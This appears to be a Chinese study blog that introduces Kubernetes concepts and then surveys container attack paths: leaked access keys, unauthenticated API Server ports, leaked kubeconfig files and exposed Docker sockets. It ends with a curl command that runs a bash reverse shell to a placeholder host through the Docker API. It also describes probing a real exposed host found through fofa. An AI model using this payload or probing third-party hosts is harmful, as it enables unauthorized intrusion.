\u8fd9\u4e9b\u5bb9\u5668\u7684\u8d44\u6e90\u5171\u4eab\u4ee5\u53ca\u76f8\u4e92\u4ea4\u4e92\u90fd\u662f\u7531pod\u91cc\u9762\u7684pause\u5bb9\u5668\u6765\u5b8c\u6210\u7684\uff0c\u6bcf\u521d\u59cb\u5316\u4e00\u4e2apod\u65f6\u4fbf\u4f1a\u751f\u6210\u4e00\u4e2apause\u5bb9\u5668\u3002 \u642d\u5efaK8S \u6211\u662f\u8ddf\u7740\u8fd9\u4e2a\u6587\u7ae0\u6765\u7684\uff0cK8S\u642d\u5efa\u5f88\u7e41\u7410\u3002\u3002\u3002 https://www.updateweb.cn/zwfec/item-367.html K8S\u7684\u57fa\u7840\u6982\u5ff5 ref: https://kuboard.cn/learning/ (\u975e\u5e38\u597d\u7684\u4e2d\u6587\u6559\u7a0b) https://kubernetes.io/zh/docs/tutorials/kubernetes-basics/ (k8s\u5b98\u65b9\u6559\u7a0b\uff0c\u6709\u4ea4\u4e92\u5f0f\u64cd\u4f5c\u754c\u9762\uff0c\u7a0d\u5fae\u6709\u70b9\u4e0d\u597d\u7684\u662f\u6709\u4e9b\u5730\u65b9\u6ca1\u6709\u4e2d\u6587) \u90e8\u7f72\u2014\u2014Deployment k8s\u4e2d\u7684\u5e94\u7528\u7a0b\u5e8f\u662f\u901a\u8fc7 Deployment\u6765\u90e8\u7f72\u7684\uff0cDeployment\u6765\u6307\u5bfck8s\u5b8c\u6210\u5e94\u7528\u7a0b\u5e8f\u7684\u90e8\u7f72\u548c\u66f4\u65b0\u7ef4\u62a4\u3002 \u6bd4\u5982\u8bf4\uff0c\u5f53Deployment\u5728\u90e8\u7f72\u5e94\u7528\u65f6\uff0cmaster\u8282\u70b9\u4f1a\u9009\u62e9\u6700\u5408\u9002\u7684\u8282\u70b9\u521b\u5efa\u5305\u542b\u76f8\u5e94Container\uff08\u5bb9\u5668\uff09\u7684POD \u53c8\u6bd4\u5982\u8bf4\uff0cDeployment\u4f1a\u76d1\u63a7\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b\uff0c\u5f53\u8fd0\u884c\u5e94\u7528\u7a0b\u5e8f\u7684\u5de5\u4f5c\u8282\u70b9\u5b95\u673a\u65f6\uff0c\u5b83\u5c06\u4f1a\u5728\u5224\u65ad\u96c6\u7fa4\u4e2d\u6700\u9002\u5b9c\u91cd\u65b0\u90e8\u7f72\u7684\u5de5\u4f5c\u8282\u70b9\uff0c\u5e76\u5728\u5176\u4e0a\u9762\u91cd\u65b0\u521b\u5efa\u65b0\u7684\u5b9e\u4f8b\uff08\u65b0\u521b\u5efa\u7684\u5e94\u7528\u7a0b\u5e8f\u7684POD ip\u548cpod\u540d\u4f1a\u4e0e\u4e4b\u524d\u7684\u4e0d\u540c\uff09\u3002 \u76f8\u5173\u547d\u4ee4\uff1a ## \u67e5\u770b Deployment kubectl get deployments ## \u67e5\u770b Pod kubectl get pods #\u6839\u636eyaml\u6587\u4ef6\u90e8\u7f72 kubectl apply -f nginx-deployment.yaml \u4e00\u4e2ayaml\u6587\u4ef6\u5dee\u4e0d\u591a\u5c31\u957f\u8fd9\u6837 apiVersion: apps/v1 #\u4e0ek8s\u96c6\u7fa4\u7248\u672c\u6709\u5173\uff0c\u4f7f\u7528 kubectl api-versions \u5373\u53ef\u67e5\u770b\u5f53\u524d\u96c6\u7fa4\u652f\u6301\u7684\u7248\u672c kind: Deployment #\u8be5\u914d\u7f6e\u7684\u7c7b\u578b\uff0c\u6211\u4eec\u4f7f\u7528\u7684\u662f Deployment metadata: #\u8bd1\u540d\u4e3a\u5143\u6570\u636e\uff0c\u5373 Deployment \u7684\u4e00\u4e9b\u57fa\u672c\u5c5e\u6027\u548c\u4fe1\u606f name: nginx-deployment #Deployment \u7684\u540d\u79f0 labels: #\u6807\u7b7e\uff0c\u53ef\u4ee5\u7075\u6d3b\u5b9a\u4f4d\u4e00\u4e2a\u6216\u591a\u4e2a\u8d44\u6e90\uff0c\u5176\u4e2dkey\u548cvalue\u5747\u53ef\u81ea\u5b9a\u4e49\uff0c\u53ef\u4ee5\u5b9a\u4e49\u591a\u7ec4\uff0c\u76ee\u524d\u4e0d\u9700\u8981\u7406\u89e3 app: nginx #\u4e3a\u8be5Deployment\u8bbe\u7f6ekey\u4e3aapp\uff0cvalue\u4e3anginx\u7684\u6807\u7b7e spec: #\u8fd9\u662f\u5173\u4e8e\u8be5Deployment\u7684\u63cf\u8ff0\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\u4f60\u671f\u5f85\u8be5Deployment\u5728k8s\u4e2d\u5982\u4f55\u4f7f\u7528 replicas: 1 #\u4f7f\u7528\u8be5Deployment\u521b\u5efa\u4e00\u4e2a\u5e94\u7528\u7a0b\u5e8f\u5b9e\u4f8b selector: #\u6807\u7b7e\u9009\u62e9\u5668\uff0c\u4e0e\u4e0a\u9762\u7684\u6807\u7b7e\u5171\u540c\u4f5c\u7528\uff0c\u76ee\u524d\u4e0d\u9700\u8981\u7406\u89e3 matchLabels: #\u9009\u62e9\u5305\u542b\u6807\u7b7eapp:nginx\u7684\u8d44\u6e90 app: nginx template: #\u8fd9\u662f\u9009\u62e9\u6216\u521b\u5efa\u7684Pod\u7684\u6a21\u677f metadata: #Pod\u7684\u5143\u6570\u636e labels: #Pod\u7684\u6807\u7b7e\uff0c\u4e0a\u9762\u7684selector\u5373\u9009\u62e9\u5305\u542b\u6807\u7b7eapp:nginx\u7684Pod app: nginx spec: #\u671f\u671bPod\u5b9e\u73b0\u7684\u529f\u80fd\uff08\u5373\u5728pod\u4e2d\u90e8\u7f72\uff09 containers: #\u751f\u6210container\uff0c\u4e0edocker\u4e2d\u7684container\u662f\u540c\u4e00\u79cd - name: nginx #container\u7684\u540d\u79f0 image: nginx:1.7.9 #\u4f7f\u7528\u955c\u50cfnginx:1.7.9\u521b\u5efacontainer\uff0c\u8be5container\u9ed8\u8ba480\u7aef\u53e3\u53ef\u8bbf\u95ee POD\u4e0eNode \u4e00\u4e2aPOD\u53ef\u4ee5\u5305\u542b\u591a\u4e2a\u5bb9\u5668\uff0c\u8fd9\u4e9b\u5bb9\u5668\u5171\u4eab\u7740POD\u4e0a\u7684\u8d44\u6e90\uff08\u5982\u7f51\u7edcIP\uff0c\u5b58\u50a8\u7a7a\u95f4\u7b49\uff09 POD\u662f\u96c6\u7fa4\u4e0a\u6700\u57fa\u7840\u7684\u5355\u5143 \u6bcf\u4e2aPOD\u5bf9\u4e0e\u5176\u5bf9\u5e94\u7684\u8282\u70b9Node\u7ed1\u5b9a\uff0c\u4e00\u4e2aPOD\u5bf9\u5e94\u7740\u4e00\u4e2aIP\u3002 Pod\u9700\u8981\u5728Node\u4e0a\u8fd0\u884c\uff0c\u4e00\u4e2aNode\u53ef\u4ee5\u8fd0\u884c\u7740\u591a\u4e2aPod\uff0c\u4e00\u4e2aNode\u5bf9\u5e94\u7740\u96c6\u7fa4\u4e2d\u7684\u4e00\u53f0\u673a\u5668\u3002 Node\u8282\u70b9\u7531Master\u8282\u70b9\u7edf\u4e00\u7ba1\u7406\uff0cMaster\u4f1a\u6839\u636e\u5404Node\u7684\u8d44\u6e90\u53ef\u7528\u7a0b\u5ea6\u81ea\u52a8\u8c03\u5ea6Pod\u5230\u4e0d\u540c\u7684Node\u4e0a\u3002 \u518d\u6765\u8bf4\u8bf4Node \u4e00\u4e2a\u8282\u70b9\u7684\u72b6\u6001\u5927\u81f4\u6709\u4ee5\u4e0b\u7684\u4e1c\u897f Addresses Conditions Capacity and Allocatable Info \u5730\u5740 \u72b6\u51b5(conditions \u5b57\u6bb5\u63cf\u8ff0\u4e86\u6240\u6709 Running \u8282\u70b9\u7684\u72b6\u6001) \u5bb9\u91cf\u4e0e\u53ef\u5206\u914d \u4fe1\u606f \u76f8\u5173\u547d\u4ee4 #\u83b7\u53d6\u7c7b\u578b\u4e3aPod\u7684\u8d44\u6e90\u5217\u8868 kubectl get pods #\u83b7\u53d6\u7c7b\u578b\u4e3aNode\u7684\u8d44\u6e90\u5217\u8868 kubectl get nodes ## kubectl describe \u8d44\u6e90\u7c7b\u578b \u8d44\u6e90\u540d\u79f0 #\u67e5\u770b\u540d\u79f0\u4e3anginx-XXXXXX\u7684Pod\u7684\u4fe1\u606f kubectl describe pod nginx-XXXXXX #\u67e5\u770b\u540d\u79f0\u4e3anginx\u7684Deployment\u7684\u4fe1\u606f kubectl describe deployment nginx #\u67e5\u770b\u540d\u79f0\u4e3anginx-pod-XXXXXXX\u7684Pod\u5185\u7684\u5bb9\u5668\u6253\u5370\u7684\u65e5\u5fd7 kubectl logs -f podname #\u5728Pod\u4e2d\u8fd0\u884c\u547d\u4ee4 kubectl exec -it nginx-pod-xxxxxx /bin/bash \u670d\u52a1\u2014\u2014Service \u901a\u8fc7\u4ee5\u4e0a\u5185\u5bb9\u6211\u4eec\u77e5\u9053\uff0c\u5e94\u7528\u7a0b\u5e8f\u6240\u5728\u7684Pod\u662f\u4e00\u76f4\u53d8\u52a8\u7740\u7684\uff0c\u800c\u6bcf\u4e2aPod\u7684ip\u53c8\u4e0d\u4e00\u6837\uff0c\u4f46\u662f\u5bf9\u4e8e\u524d\u7aef\u7528\u6237\u6765\u8bf4\uff0c\u5e94\u7528\u7a0b\u5e8f\u7684\u8bbf\u95ee\u5730\u5740\u5e94\u8be5\u662f\u552f\u4e00\u7684\u624d\u884c\u3002 \u56e0\u6b64k8s\u63d0\u4f9b\u4e86\u4e00\u4e2a\u673a\u5236\u7528\u6765\u4e3a\u524d\u7aef\u5c4f\u853d\u540e\u7aefPod\u53d8\u52a8\u5e26\u6765\u7684IP\u53d8\u52a8\uff0c\u8fd9\u4fbf\u662fService\u3002 Service\u4e3a\u4e00\u7cfb\u5217\u6709\u76f8\u540c\u7279\u5f81\u7684Pod\uff08\u4e00\u4e2a\u5e94\u7528\u7684Pod\u5728\u4e0d\u505c\u53d8\u6362\uff0c\u4f46\u662f\u4e0d\u8bba\u600e\u4e48\u53d8\u6362\u8fd9\u4e9bPod\u90fd\u6709\u76f8\u540c\u7684\u7279\u5f81\uff09\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7edf\u4e00\u7684\u8bbf\u95ee\u65b9\u5f0f\uff0c Service\u662f\u901a\u8fc7\u6807\u7b7e\u9009\u62e9\u5668\uff08 LabelSelector \uff09\u6765\u8bc6\u522b\u6709\u54ea\u4e9bPod\u6709\u76f8\u540c\u7279\u5f81\uff08\u5e26\u6709\u7279\u5b9aLable\u6807\u7b7e\u7684POD\uff0cLable\u53ef\u4ee5\u7531\u7528\u6237\u8bbe\u7f6e\uff0c\u6807\u7b7e\u5b58\u5728\u4e8e\u6240\u6709K8S\u5bf9\u8c61\u4e0a\u5e76\u4e0d\u4ec5\u4ec5\u5c40\u9650\u4e8ePod\uff09 \u53ef\u4ee5\u7f16\u6210\u4e00\u4e2a\u5bb9\u5668\u7ec4\u7684\u3002 Service\u6709\u4e09\u79cd\u9009\u9879\u66b4\u9732\u5e94\u7528\u7a0b\u5e8f\u7684\u5165\u53e3\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbe\u7f6e\u5e94\u7528\u7a0b\u5e8f\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684Service \u9879\u7684spec.type \u503c\u6765\u8c03\u6574 ClusterIP \uff08\u9ed8\u8ba4\uff09 \u5728\u7fa4\u96c6\u4e2d\u7684\u5185\u90e8IP\u4e0a\u516c\u5e03\u670d\u52a1\uff0c\u8fd9\u79cd\u65b9\u5f0f\u7684 Service\uff08\u670d\u52a1\uff09\u53ea\u5728\u96c6\u7fa4\u5185\u90e8\u53ef\u4ee5\u8bbf\u95ee\u5230 - NodePort \u4f7f\u7528 NAT \u5728\u96c6\u7fa4\u4e2d\u6bcf\u4e2a\u7684\u540c\u4e00\u7aef\u53e3\u4e0a\u516c\u5e03\u670d\u52a1\u3002\u8fd9\u79cd\u65b9\u5f0f\u4e0b\uff0c\u53ef\u4ee5\u901a\u8fc7\u8bbf\u95ee\u96c6\u7fa4\u4e2d\u4efb\u610f\u8282\u70b9+\u7aef\u53e3\u53f7\u7684\u65b9\u5f0f\u8bbf\u95ee\u670d\u52a1 <NodeIP>:<NodePort> \u3002\u6b64\u65f6 ClusterIP \u7684\u8bbf\u95ee\u65b9\u5f0f\u4ecd\u7136\u53ef\u7528\u3002 - LoadBalancer \u5728\u4e91\u73af\u5883\u4e2d\uff08\u9700\u8981\u4e91\u4f9b\u5e94\u5546\u53ef\u4ee5\u652f\u6301\uff09\u521b\u5efa\u4e00\u4e2a\u96c6\u7fa4\u5916\u90e8\u7684\u8d1f\u8f7d\u5747\u8861\u5668\uff0c\u5e76\u4e3a\u4f7f\u7528\u8be5\u8d1f\u8f7d\u5747\u8861\u5668\u7684 IP \u5730\u5740\u4f5c\u4e3a\u670d\u52a1\u7684\u8bbf\u95ee\u5730\u5740\u3002\u6b64\u65f6 ClusterIP \u548c NodePort \u7684\u8bbf\u95ee\u65b9\u5f0f\u4ecd\u7136\u53ef\u7528\u3002 \u5982\u4e0a\u56fe\uff0cService A \u4f1a\u5c06\u8bf7\u6c42\u8f6c\u53d1\u81f3\u5185\u90e8IP\u5730\u5740\u4e3a10.10.10.1 \u7684POD\u4e0a\uff0cService B\u540c\u7406\uff0c\u4f1a\u8f6c\u53d1\u523010.10.10.3\u30014\u30015 \u4e0a \u5728\u6bcf\u4e2a\u8282\u70b9\u4e0a\u90fd\u6709Kube-proxy\u670d\u52a1\uff0cService\u4f7f\u7528\u5176\u5c06\u94fe\u63a5\u8def\u7531\u5230Pod \u4f38\u7f29\u2014\u2014Scaling \u53ef\u4ee5\u901a\u8fc7\u66f4\u6539deployment\u914d\u7f6e\u6587\u4ef6\u4e2d\u7684replicas\u9879\u6765\u8bbe\u7f6e\u5f00\u542f\u7684POD\u6570\u91cf \u5f53\u6d41\u91cf\u589e\u591a\u5bfc\u81f4\u5e94\u7528\u7a0b\u5e8fPOD\u8d1f\u8f7d\u52a0\u91cd\u540e\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539replicas\u589e\u52a0POD\u6570\u91cf\u6765\u51cf\u8f7b\u8d1f\u62c5\uff0c\u8bbf\u95ee\u6d41\u91cf\u5c06\u4f1a\u901a\u8fc7\u8d1f\u8f7d\u5747\u8861\u5728\u591a\u4e2aPOD\u4e4b\u95f4\u8f6c\u53d1 \u6eda\u52a8\u66f4\u65b0\u2014\u2014 Rolling Update \u5f53\u6211\u4eec\u60f3\u5bf9\u5df2\u7ecf\u90e8\u7f72\u7684\u7a0b\u5e8f\u8fdb\u884c\u5347\u7ea7\u66f4\u65b0\uff0c\u4f46\u53c8\u4e0d\u60f3\u8ba9\u7a0b\u5e8f\u505c\u6b62\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528\u6eda\u52a8\u66f4\u65b0\u6765\u5b9e\u73b0\u3002 \u6eda\u52a8\u66f4\u65b0\u901a\u8fc7\u4f7f\u7528\u65b0\u7248\u672c\u7684POD\u9010\u6b65\u66ff\u4ee3\u65e7\u7248\u672cPOD\u6765\u5b9e\u73b0\u96f6\u505c\u673a\u66f4\u65b0 \u6eda\u52a8\u66f4\u65b0\u662fK8S\u9ed8\u8ba4\u7684\u66f4\u65b0\u65b9\u5f0f K8S\u5b89\u5168 \u4e0b\u56fe\u662fK8S\u7684\u4e00\u4e9b\u653b\u51fb\u6846\u67b6 \u672c\u6587\u5c31\u56f4\u7ed5\u7740\u8fd9\u4e2a\u6846\u67b6\uff0c\u53d9\u8ff0\u4e00\u4e9b\u6709\u7528\u7684\u653b\u51fb\u624b\u6cd5\u5427 \u521d\u59cb\u8bbf\u95ee \u4e91\u8d26\u53f7AK\u6cc4\u9732 \u5728\u5982\u4eca\u7684\u4e91\u7684\u5927\u73af\u5883\u4e0b\uff0c\u8bb8\u591a\u4e1a\u52a1\u4ee3\u7801\u60f3\u8981\u4e0e\u4e91\u670d\u52a1\u8fdb\u884c\u901a\u4fe1\uff0c\u5c31\u9700\u8981\u901a\u8fc7accesskey\u8fd9\u4e2a\u4e1c\u897f\u8fdb\u884c\u9274\u6743\uff0c\u9274\u6743\u901a\u8fc7\u540e\u624d\u80fd\u4e0e\u4e91\u670d\u52a1\u8fdb\u884c\u901a\u4fe1\u3002 \u901a\u4fd7\u6765\u8bb2\uff0c\u4eba\u60f3\u8981\u8bbf\u95ee\u4e00\u4e2a\u670d\u52a1\uff0c\u5f80\u5f80\u9700\u8981\u63d0\u4f9b\u5bc6\u7801\u6765\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\uff1b\u800c\u4ee3\u7801\u60f3\u8981\u8bbf\u95ee\u4e00\u4e2a\u4e91\u670d\u52a1API\uff0c\u5219\u9700\u8981\u63d0\u4f9baccesskey\u6765\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002 \u5982\u679caccesskey\u6cc4\u9732\u4e86\uff0c\u6211\u4eec\u4fbf\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2aaccesskey\u6765\u4e0e\u4e91\u670d\u52a1\u901a\u4fe1\uff0c\u53cd\u5f39\u4e2a\u4e91\u4e3b\u673a\u7684shell\u56de\u6765\u4f5c\u4e3a\u5165\u53e3\u70b9\u6162\u6162\u5f80\u5185\u6253\u3002 \u4e0b\u9762\u6587\u7ae0\u662f\u5173\u4e8e\u4e91\u539f\u751f\u5b89\u5168\u4e2daccesskey\u5b89\u5168\u66f4\u52a0\u8be6\u7ec6\u7684\u8bba\u8ff0\uff0c\u9605\u8bfb\u540e\u53ef\u4ee5\u5bf9accesskey\u7684\u6982\u5ff5\u6709\u66f4\u6df1\u5165\u7684\u4e86\u89e3\u3002 https://www.freebuf.com/articles/web/287512.html https://www.freebuf.com/articles/web/255717.html \u6076\u610f\u955c\u50cf \u5728docker\u4e2d\uff0c\u5bb9\u5668\u7684\u5efa\u7acb\u4f9d\u8d56\u4e8e\u955c\u50cf\uff0c\u5982\u679c\u800c\u5982\u679cpull\u5f97\u5230\u7684\u955c\u50cf\u662f\u4e00\u4e2a\u6076\u610f\u955c\u50cf\uff0c\u6216\u8005pull\u5f97\u5230\u7684\u955c\u50cf\u672c\u8eab\u5c31\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u4fbf\u4f1a\u5e26\u6765\u5b89\u5168\u98ce\u9669 \u4e0b\u56fe\u4fbf\u662fdockerhub\u4e0a\u90e8\u7f72\u6316\u77ff\u8f6f\u4ef6\u7684\u6076\u610f\u955c\u50cf\uff0c\u5b83\u4f1a\u4ecegithub\u4e0a\u4e0b\u8f7d\u6076\u610f\u6316\u77ff\u8f6f\u4ef6\u8fdb\u884c\u6316\u77ff \u4e2a\u4eba\u89c9\u5f97\u6b64\u65b9\u6cd5\u591a\u7528\u4e8e\u9493\u9c7c\uff1f API Server\u672a\u6388\u6743 \u5c5e\u4e8e\u662fK8S\u4e2d\u7684\u7ecf\u5178\u6f0f\u6d1e\u4e86 \u56de\u987e\u4e00\u4e0bAPI Server\u7684\u4f5c\u7528\uff0c\u5b83\u5728\u96c6\u7fa4\u4e2d\u88ab\u7528\u4e8e\u63d0\u4f9bAPI\u6765\u63a7\u5236\u96c6\u7fa4\u5185\u90e8\uff0c\u5982\u679c\u6211\u4eec\u80fd\u63a7\u5236API Server\uff0c\u5c31\u610f\u5473\u7740\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5b83\u5229\u7528kubectl\u521b\u5efaPod\u5e76\u4f7f\u7528\u78c1\u76d8\u6302\u8f7d\u6280\u672f\u83b7\u53d6Node\u8282\u70b9\u63a7\u5236\u6743(\u5173\u4e8e\u78c1\u76d8\u6302\u8f7d\u83b7\u53d6\u8282\u70b9shell\u7684\u6280\u672f\u5728\u540e\u9762\u7684\u5c0f\u8282\u4e2d\u518d\u8fdb\u884c\u8be6\u7ec6\u8bba\u8ff0\uff09\u3002 API Server\u53ef\u4ee5\u5728\u4e24\u4e2a\u7aef\u53e3\u4e0a\u63d0\u4f9b\u4e86\u5bf9\u5916\u670d\u52a1\uff1a8080\uff08insecure-port\uff0c\u975e\u5b89\u5168\u7aef\u53e3\uff09\u548c6443\uff08secure-port\uff0c\u5b89\u5168\u7aef\u53e3\uff09\uff0c\u5176\u4e2d8080\u7aef\u53e3\u63d0\u4f9bHTTP\u670d\u52a1\u4e14\u65e0\u9700\u8eab\u4efd\u8ba4\u8bc1\uff0c6443\u7aef\u53e3\u63d0\u4f9bHTTPS\u670d\u52a1\u4e14\u652f\u6301\u8eab\u4efd\u8ba4\u8bc1(8080\u548c6443\u7aef\u53e3\u5e76\u4e0d\u662f\u56fa\u5b9a\u7684\uff0c\u662f\u901a\u8fc7\u914d\u7f6e\u6587\u4ef6\u6765\u63a7\u5236\u7684)\u3002 ** insecure-port \u5f00\u542f ** API Server\u57288080\u7aef\u53e3\u4e0a\u5f00\u653e\u7684\u670d\u52a1\u5e94\u8be5\u662f\u7528\u4e8e\u6d4b\u8bd5\uff0c\u4f46\u5982\u679c\u5176\u5728\u751f\u5b58\u73af\u5883\u4e2d\u88ab\u66b4\u9732\u51fa\u6765\uff0c\u653b\u51fb\u8005\u4fbf\u53ef\u4ee5\u5229\u7528\u6b64\u7aef\u53e3\u8fdb\u884c\u5bf9\u96c6\u7fa4\u7684\u653b\u51fb\u3002 \u4f46\u662f\u5229\u7528API Server\u76848080\u7aef\u53e3\u8fdb\u884c\u672a\u6388\u6743\u6d3b\u52a8\u7684\u524d\u63d0\u6761\u4ef6\u7565\u663e\u82db\u523b\uff08\u914d\u7f6e\u5931\u5f53+\u7248\u672c\u8f83\u4f4e\uff09\uff0c8080\u7aef\u53e3\u670d\u52a1\u662f\u9ed8\u8ba4\u4e0d\u542f\u52a8\u7684\uff0c\u4f46\u5982\u679c\u7528\u6237\u5728 /etc/kubernets/manifests/kube-apiserver.yaml \u4e2d\u6709 --insecure-port=8080 \u914d\u7f6e\u9879\uff0c\u90a3\u5c31\u542f\u52a8\u4e86\u975e\u5b89\u5168\u7aef\u53e3\uff0c\u6709\u4e86\u5b89\u5168\u98ce\u9669\u3002 \u6ce8\uff1a1.20\u7248\u672c\u540e\u8be5\u9009\u9879\u5df2\u65e0\u6548\u5316 \u73af\u5883\u524d\u63d0\uff1a step1:\u8fdb\u5165cd /etc/kubernetes/manifests/ step2: \u4fee\u6539api-kube.conf \u6dfb\u52a0- -\u2013insecure-port=8080 \u6dfb\u52a0- -\u2013insecure-bind-address=0.0.0.0 Kubelet \u4f1a\u76d1\u542c\u8be5\u6587\u4ef6\u7684\u53d8\u5316\uff0c\u5f53\u60a8\u4fee\u6539\u4e86 /etc/kubernetes/manifests/kube-apiserver.yaml \u6587\u4ef6\u4e4b\u540e, kubelet \u5c06\u81ea\u52a8\u7ec8\u6b62\u539f\u6709\u7684 kube-apiserver-{nodename} \u7684 Pod\uff0c\u5e76\u81ea\u52a8\u521b\u5efa\u4e00\u4e2a\u4f7f\u7528\u4e86\u65b0\u914d\u7f6e\u53c2\u6570\u7684 Pod \u4f5c\u4e3a\u66ff\u4ee3\u3002 ** secure-port \u914d\u7f6e\u9519\u8bef**\u200b \u82e5\u6211\u4eec\u4e0d\u5e26\u4efb\u4f55\u51ed\u8bc1\u7684\u8bbf\u95ee API server\u7684 secure-port\u7aef\u53e3\uff0c\u9ed8\u8ba4\u4f1a\u88ab\u670d\u52a1\u5668\u6807\u8bb0\u4e3asystem:anonymous\u7528\u6237\u3002 \u4e00\u822c\u6765\u8bf4system:anonymous\u7528\u6237\u6743\u9650\u662f\u5f88\u4f4e\u7684\uff0c\u4f46\u662f\u5982\u679c\u8fd0\u7ef4\u4eba\u5458\u7ba1\u7406\u5931\u5f53\uff0c\u5427system:anonymous\u7528\u6237\u7ed1\u5b9a\u5230\u4e86cluster-admin\u7528\u6237\u7ec4\uff0c\u90a3\u4e48\u5c31\u610f\u5473\u7740secure-port\u5141\u8bb8\u533f\u540d\u7528\u6237\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u5411\u96c6\u7fa4\u4e0b\u8fbe\u547d\u4ee4\u3002\uff08\u4e5f\u5c31\u662fsecure-port\u53d8\u6210\u67d0\u79cd\u610f\u4e49\u4e0a\u7684insecure-port\u4e86\uff09 \u590d\u73b0\uff1a kubectl -s https://192.168.111.20:6443/ --insecure-skip-tls-verify=true get nodes (192.168.111.20:6443 \u662fmaster\u8282\u70b9\u4e0aapiserver\u7684secure-port) \u7136\u540e\u63d0\u793a\u8f93\u5165\u8d26\u6237\u5bc6\u7801\uff0c\u968f\u4fbf\u4e71\u8f93\u5c31\u884c \u6b63\u5e38\u60c5\u51b5\u5e94\u8be5\u662f\u8fd9\u6837 \u4f46\u5982\u679csecure-port \u914d\u7f6e\u5931\u5f53\u51fa\u73b0\u4e86\u672a\u6388\u6743\uff0c\u5c31\u4f1a\u8fd9\u6837 configfile \u6cc4\u9732 k8s configfile\u914d\u7f6e\u6587\u4ef6\u4e2d\u53ef\u80fd\u4f1a\u6709api-server\u767b\u9646\u51ed\u8bc1\u7b49\u654f\u611f\u4fe1\u606f\uff0c\u5982\u679c\u83b7\u53d6\u5230\u4e86\u96c6\u7fa4configfile\u5185\u5bb9\uff08\u5982\u6cc4\u9732\u5728github\uff09\uff0c\u5c06\u4f1a\u5bf9\u96c6\u7fa4\u5185\u90e8\u5b89\u5168\u9020\u6210\u5de8\u5927\u5f71\u54cd\u3002 \u8fd9\u91cc\u5f15\u7528\u963f\u91cc\u4e91\u793e\u533a\u7684\u4e00\u5f20\u56fe \u5bb9\u5668\u5185\u90e8\u5e94\u7528\u5165\u4fb5 \u987e\u540d\u601d\u4e49\uff0c\u5bb9\u5668\u5185\u90e8\u5e94\u7528\u5c31\u6709\u95ee\u9898\uff08\u6bd4\u5982\u5185\u90e8\u5e94\u7528\u662ftomcat\uff0c\u4e14\u6709RCE\u6f0f\u6d1e\uff09\uff0c\u4ece\u800c\u5c31\u4f1a\u5bfc\u81f4\u9ed1\u5ba2\u83b7\u53d6Pod shell\uff0c\u62ff\u5230\u5165\u53e3\u70b9 \u79c1\u6709\u955c\u50cf\u5e93\u66b4\u9732 \u4e3e\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u4e00\u4e2a\u4f01\u4e1a\u5b83\u7684\u8bb8\u591a\u4e91\u4e0a\u5e94\u7528\u90fd\u662f\u7528\u7684\u81ea\u5efa\u7684\u79c1\u6709\u955c\u50cf\u642d\u5efa\u7684\uff0c\u6709\u4e00\u5929\u5b83\u79c1\u6709\u955c\u50cf\u6cc4\u9732\u51fa\u6765\u4e86\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u5ba1\u8ba1\u7b49\u624b\u6bb5\u53bb\u6316\u6398\u79c1\u6709\u955c\u50cf\u4e2d\u7684\u6f0f\u6d1e\uff0c\u9020\u6210\u4f9b\u5e94\u94fe\u6253\u51fb\u3002 docker.sock \u5229\u7528 Docker\u4ee5server-client\u7684\u5f62\u5f0f\u5de5\u4f5c\uff0c\u670d\u52a1\u7aef\u53ebDocker daemon\uff0c\u5ba2\u6237\u7aef\u53ebdocker client\u3002 Docker daemon\u60f3\u8c03\u7528docker\u6307\u4ee4\uff0c\u5c31\u9700\u8981\u901a\u8fc7docker.sock\u8fd9\u4e2a\u6587\u4ef6\u5411docker client\u8fdb\u884c\u901a\u8baf\u3002\u6362\u53e5\u8bdd\u8bf4\uff0cDocker daemon\u901a\u8fc7docker.sock\u8fd9\u4e2a\u6587\u4ef6\u53bb\u7ba1\u7406docker\u5bb9\u5668\uff08\u5982\u521b\u5efa\u5bb9\u5668\uff0c\u5bb9\u5668\u5185\u6267\u884c\u547d\u4ee4\uff0c\u67e5\u8be2\u5bb9\u5668\u72b6\u6001\u7b49\uff09\u3002 \u540c\u65f6\uff0cDocker daemon\u4e5f\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u5c06docker.sock\u66b4\u9732\u5728\u7aef\u53e3\u4e0a\uff0c\u4e00\u822c\u60c5\u51b5\u4e0b2375\u7aef\u53e3\u7528\u4e8e\u672a\u8ba4\u8bc1\u7684HTTP\u901a\u4fe1\uff0c2376\u7528\u4e8e\u53ef\u4fe1\u7684HTTPS\u901a\u4fe1\u3002 ** \u516c\u7f51\u66b4\u9732**\u200b \u5982\u679cdocker daemon 2375\u7aef\u53e3\u66b4\u9732\u5728\u4e86\u516c\u7f51\u4e0a\uff0c\u90a3\u4e48\u4fbf\u53ef\u4ee5\u76f4\u63a5\u5229\u7528\u8be5\u7aef\u53e3\u63a7\u5236docker\u5bb9\u5668\uff0c\u5e76\u901a\u8fc7\u65b0\u5efa\u5bb9\u5668\u914d\u5408\u78c1\u76d8\u6302\u8f7d\u6280\u672f\u83b7\u53d6\u5bbf\u4e3b\u673a\u6743\u9650\u3002 fofa\u641c\u7d22 server=\"Docker\" && port=\"2375\" \u53ef\u4ee5\u53d1\u73b0\u6709\u5f88\u591a\u66b4\u9732\u5728\u516c\u7f51\u7684docker.sock\uff0c \u6211\u4eec\u9009\u4e00\u4e2a\u6765\u8bd5\u8bd5\u6c34 \u53ef\u4ee5\u53d1\u73b0\u662f\u6210\u529f\u7684\u8c03\u7528\u4e86API\u67e5\u8be2\u4e86\u5bb9\u5668\u72b6\u6001 \u7136\u540e\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u5982\u4e0b\u6307\u4ee4\uff0c\u5728\u6307\u5b9a\u5bb9\u5668\u5185\u90e8\u6267\u884c\u547d\u4ee4 curl -X POST \"http://ip:2375/containers/{container_id}/exec\" -H \"Content-Type: application/json\" --data-binary '{\"Cmd\": [\"bash\", \"-c\", \"bash -i >& /dev/tcp/xxxx/1234 0>&1\"]}' 